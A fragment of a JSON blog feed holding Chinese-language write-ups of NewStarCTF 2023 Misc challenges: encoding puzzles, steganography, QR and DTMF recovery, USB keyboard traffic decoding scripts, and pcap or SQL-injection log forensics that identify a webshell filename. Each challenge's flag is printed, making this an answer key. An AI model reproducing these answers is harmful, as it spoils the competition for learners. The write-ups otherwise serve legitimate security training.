data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TIp8Ks4fVReKJHon.png!thumbnail\" alt=\"\"></p>\n<p>base91 编码，解码得到 flag</p>\n<p><strong>flag{a308067fc26625d31a421247adce3893}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK3/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK3/",
            "title": "NewStarCTF2023Misc week3",
            "date_published": "2024-04-16T05:58:19.011Z",
            "content_html": "<h1 id=\"week3\"><a class=\"markdownIt-Anchor\" href=\"#week3\">#</a> <strong>WEEK3</strong></h1>\n<h2 id=\"阳光开朗大男孩\"><a class=\"markdownIt-Anchor\" href=\"#阳光开朗大男孩\">#</a> 阳光开朗大男孩</h2>\n<p>得到两个 txt 文件</p>\n<p>flag.txt：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌊⏩🔬🚹✉☀☺🚹🐅🎤🛩💵🌿🌊🚰😊🌊✉🐎❓🎈🌉👑🎅📮🥋👣🕹🚪☀🔄🚫🐍❓🐍😊☀🔬🍍🤣🎈🥋🙃👑🌏🐎🌊📮😂💵🏹👉❓😇🍴💧☺💵😁☃👉🎅👁☂🌿👉🍴🌪👌🍴🍵🖐😇🍍😀🗒🗒</span><br></pre></td></tr></table></figure>\n<p>secret.txt：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">法治自由公正爱国公正敬业法治和谐平等友善敬业法治富强公正民主法治和谐法治和谐法治法治公正友善敬业法治文明公正自由平等诚信平等公正敬业法治和谐平等友善敬业法治和谐和谐富强和谐富强和谐富强平等友善敬业公正爱国和谐自由法治文明公正自由平等友善敬业法治富强和谐自由法治和谐法治和谐法治和谐法治法治和谐富强法治文明公正自由公正自由公正自由公正自由</span><br></pre></td></tr></table></figure>\n<p>猜测是 emoji-aes 加密，secret 便是 key<br>\nsecret 社会主义核心价值观编码解码得到：this_password_is_s000_h4rd_p4sssw0rdddd</p>\n<p>is 后面的作为 key：<strong>s000_h4rd_p4sssw0rdddd</strong></p>\n<p>emoji-aes 解密：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uuIAzxdtHbS8YJXx.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{3m0ji_1s_s0000_1nt3rest1ng_0861aada1050}</strong></p>\n<h2 id=\"大怨种\"><a class=\"markdownIt-Anchor\" href=\"#大怨种\">#</a> 大怨种</h2>\n<p>拿到 gif 文件，使用 gifsplitter 进行分离</p>\n<p>得到二维码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xe7ADDAB9xaGT6GS.png!thumbnail\" alt=\"\"></p>\n<p>使用网站进行扫描</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm9kdWN0cy5hc3Bvc2UuYXBwL2JhcmNvZGUvcmVjb2duaXplIw==\">https://products.aspose.app/barcode/recognize#</span></p>\n<p>得到字符串：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">666C61677B315F64306E745F6B306E775F6830775F746F5F7363346E5F746831735F633064335F61cef808a868e&#125;</span><br></pre></td></tr></table></figure>\n<p>后半段为明文字符串：cef808a868e}<br>\n 前半段进行 16 进制转换后为 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/InA9QaaKZ8hc5n7i.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{1_d0nt_k0nw_h0w_to_sc4n_th1s_c0d3_acef808a868e}</strong></p>\n<h2 id=\"2-分析\"><a class=\"markdownIt-Anchor\" href=\"#2-分析\">#</a> 2 - 分析</h2>\n<p>拿到流量包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zIeg774q7rr9NGq7.png!thumbnail\" alt=\"\"></p>\n<p>在流 30 找到了攻击者登录使用的用户名</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MreZT2KEtvVDViIf.png!thumbnail\" alt=\"\"></p>\n<p>在流 33 看到了利用 index.php 进行了一个写马的的操作，也就是说存在漏洞的文件名为 index.php，而被写入一句话木马的文件 wh1t3g0d.php 便是 webshell 文件名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;best_admin_index.php_wh1t3g0d.php&#125;</span><br></pre></td></tr></table></figure>\n<p>将括号内 md5 之后便是 flag<br>\n<strong>flag{*</strong>*4069afd7089f7363198d899385ad688b}**</p>\n<h2 id=\"键盘侠\"><a class=\"markdownIt-Anchor\" href=\"#键盘侠\">#</a> 键盘侠</h2>\n<p>同样是一个流量包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5MgDDo9iioNDSYKS.png!thumbnail\" alt=\"\"></p>\n<p>发现是 usb 的流量，又是老知识点了</p>\n<p>先翻翻流量看看 data 数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SJNeG6XmjBzsUU3V.png!thumbnail\" alt=\"\"></p>\n<p>发现 HID data 是 8 字节的数据，猜测为键盘流量，先用 tshark 进行导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r draobyek.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure>\n<p>得到 usbdata.txt 之后再进行删除空行添加冒号的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">info = &#x27;&#x27;&#x27;</span><br><span class=\"line\">kali下运行：</span><br><span class=\"line\">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class=\"line\">提取流量包信息</span><br><span class=\"line\">然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(info)</span><br><span class=\"line\"></span><br><span class=\"line\">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)</span><br><span class=\"line\">shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))</span><br><span class=\"line\">f = open(f_data, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 整理到out.txt</span><br><span class=\"line\">with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f_out:</span><br><span class=\"line\">    for i in f.readlines():</span><br><span class=\"line\">        s = i.strip()</span><br><span class=\"line\">        # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">        if len(s) == shujian:</span><br><span class=\"line\">            # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]</span><br><span class=\"line\">            ns = &quot;:&quot;.join(nsl)</span><br><span class=\"line\">            f_out.write(ns)</span><br><span class=\"line\">            f_out.write(&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hhTygsJYNnbzlQwI.png!thumbnail\" alt=\"\"></p>\n<p>得到 out.txt</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/oiaDrRFILXOpqUjS.png!thumbnail\" alt=\"\"></p>\n<p>再用脚本进行对照解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">#脚本处理完的文件（为冒号分隔的文件）</span><br><span class=\"line\">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">output = []</span><br><span class=\"line\">keys = open(&#x27;out.txt&#x27;)</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;:</span><br><span class=\"line\">             continue</span><br><span class=\"line\">        if line[6:8] in normalKeys.keys():</span><br><span class=\"line\">            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;]</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            output += [&#x27;[unknown]&#x27;]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\"></span><br><span class=\"line\">flag=0</span><br><span class=\"line\">print(&quot;&quot;.join(output))</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        a=output.index(&#x27;&lt;DEL&gt;&#x27;)</span><br><span class=\"line\">        del output[a]</span><br><span class=\"line\">        del output[a-1]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if output[i]==&quot;&lt;CAP&gt;&quot;:</span><br><span class=\"line\">            flag+=1</span><br><span class=\"line\">            output.pop(i)</span><br><span class=\"line\">            if flag==2:</span><br><span class=\"line\">                flag=0</span><br><span class=\"line\">        if flag!=0:</span><br><span class=\"line\">            output[i]=output[i].upper()</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">print (&#x27;output :&#x27; + &quot;&quot;.join(output))</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">w3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vbafjwrisgjadwwiihdgja13882hxbbbna\t&lt;CAP&gt;&lt;CAP&gt;ff&lt;DEL&gt;lll&lt;DEL&gt;&lt;DEL&gt;aaa&lt;DEL&gt;&lt;DEL&gt;gggg&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#123;999&lt;DEL&gt;&lt;DEL&gt;999&lt;DEL&gt;&lt;DEL&gt;11&lt;DEL&gt;9aaa&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;eb2---&lt;DEL&gt;&lt;DEL&gt;a450---&lt;DEL&gt;&lt;DEL&gt;2f5f&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;--&lt;DEL&gt;7bfc[unknown][unknown][unknown]-8989&lt;DEL&gt;&lt;DEL&gt;dfdf&lt;DEL&gt;&lt;DEL&gt;4bfa4bfa&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;85848584&#125;&#125;&#125;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;nice&lt;SPACE&gt;work!1you&lt;SPACE&gt;got&lt;SPACE&gt;this&lt;SPACE&gt;flag</span><br><span class=\"line\">output :w3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vbafjwrisgjadwwiihdgja13882hxbbbna\t&lt;CAP&gt;FLAG&#123;9919AEB2-A450-2F5F-7BFC[UNKNOWN][UNKNOWN][UNKNOWN]-89DF4BFA8584&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;NICE&lt;SPACE&gt;WORK!1YOU&lt;SPACE&gt;GOT&lt;SPACE&gt;THIS&lt;SPACE&gt;FLAG</span><br></pre></td></tr></table></figure>\n<p>在上一行可以看到解出来的其实是小写字母，于是把 FLAG {9919AEB2-A450-2F5F-7BFC-89DF4BFA8584} 换成小写就是最终 flag 了<br>\n<strong> flag {9919aeb2-a450-2f5f-7bfc-89df4bfa8584}</strong></p>\n<h2 id=\"滴滴滴\"><a class=\"markdownIt-Anchor\" href=\"#滴滴滴\">#</a> 滴滴滴</h2>\n<p>拿到一张图片和一个音频，听了下应该是手机拨号的声音，还是老知识点了：DTMF 拨号音识别</p>\n<p>利用 dtmf2num 命令进行识别</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dtmf2num 奇怪的音频.wav</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Rn9UVgO1Xjx905Mu.png!thumbnail\" alt=\"\"></p>\n<p>得到号码 52563319066，根据题目提示这应该是作为 jpg 的密码，猜测为 steghide 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V8RYV0vHbQDeYKMz.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{1nf0rm4t10n_s3cur1ty_1s_a_g00d_j0b_94e0308b}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK2/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK2/",
            "title": "NewStarCTF2023Misc week2",
            "date_published": "2024-04-16T05:58:19.010Z",
            "content_html": "<h1 id=\"week2\"><a class=\"markdownIt-Anchor\" href=\"#week2\">#</a> <strong>WEEK2</strong></h1>\n<h2 id=\"新建word文档\"><a class=\"markdownIt-Anchor\" href=\"#新建word文档\">#</a> 新建 Word 文档</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v7EVjEwOIoNLCVav.png!thumbnail\" alt=\"\"></p>\n<p>这是文档所做的一个限制导致无法复制，直接右键字体中取消隐藏文字的勾选即可复制</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==\">http://hi.pcmoe.net/buddha.html</span><br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/CfnzVEMjPjKI4DzE.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>解密得到 flag</p>\n<p><strong>flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}</strong></p>\n<h2 id=\"永不消逝的电波\"><a class=\"markdownIt-Anchor\" href=\"#永不消逝的电波\">#</a> 永不消逝的电波</h2>\n<p>将 wav 文件使用 au 进行查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EFvT4GwOt1iOm2Dx.png!thumbnail\" alt=\"\"></p>\n<p>摩斯密码，手敲出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YNAUh8kIKg95Abj6.png!thumbnail\" alt=\"\"></p>\n<p>这里由于解密问题 flag 其实是全小写，可以使用别的在线网站也可以直接转为小写提交</p>\n<p><strong>flag{thebestctferisyou}</strong></p>\n<h2 id=\"base\"><a class=\"markdownIt-Anchor\" href=\"#base\">#</a> base!</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BBDm6RvMknxfUIDG.png!thumbnail\" alt=\"\"></p>\n<p>base 隐写，脚本一把梭</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def get_base64_diff_value(s1, s2):</span><br><span class=\"line\">    base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class=\"line\">    res = 0</span><br><span class=\"line\">    for i in xrange(len(s2)):</span><br><span class=\"line\">        if s1[i] != s2[i]:</span><br><span class=\"line\">            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class=\"line\">    return res</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def solve_stego():</span><br><span class=\"line\">    with open(&#x27;base.txt&#x27;, &#x27;rb&#x27;) as f:</span><br><span class=\"line\">        file_lines = f.readlines()</span><br><span class=\"line\">        bin_str = &#x27;&#x27;</span><br><span class=\"line\">        for line in file_lines:</span><br><span class=\"line\">            steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">            norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class=\"line\">            print diff</span><br><span class=\"line\">            pads_num = steg_line.count(&#x27;=&#x27;)</span><br><span class=\"line\">            if diff:</span><br><span class=\"line\">                bin_str += bin(diff)[2:].zfill(pads_num * 2)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                bin_str += &#x27;0&#x27; * pads_num * 2</span><br><span class=\"line\">            print goflag(bin_str)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def goflag(bin_str):</span><br><span class=\"line\">    res_str = &#x27;&#x27;</span><br><span class=\"line\">    for i in xrange(0, len(bin_str), 8):</span><br><span class=\"line\">        res_str += chr(int(bin_str[i:i + 8], 2))</span><br><span class=\"line\">    return res_str</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    solve_stego()</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3fEh1xZ4STcLIlP4.png!thumbnail\" alt=\"\"></p>\n<p>得到 iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</p>\n<p>base58 解码得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7zk8eOvNtd33FC5w.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{b4se_1s_4_g0od_c0d3}</strong></p>\n<h2 id=\"1-序章\"><a class=\"markdownIt-Anchor\" href=\"#1-序章\">#</a> 1 - 序章</h2>\n<p>分析 sql 注入日志，手动筛选出注入成功的 10 进制</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nRIczEKu9SFDZjwV.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32}</strong></p>\n<h2 id=\"webshell的利用\"><a class=\"markdownIt-Anchor\" href=\"#webshell的利用\">#</a> WebShell 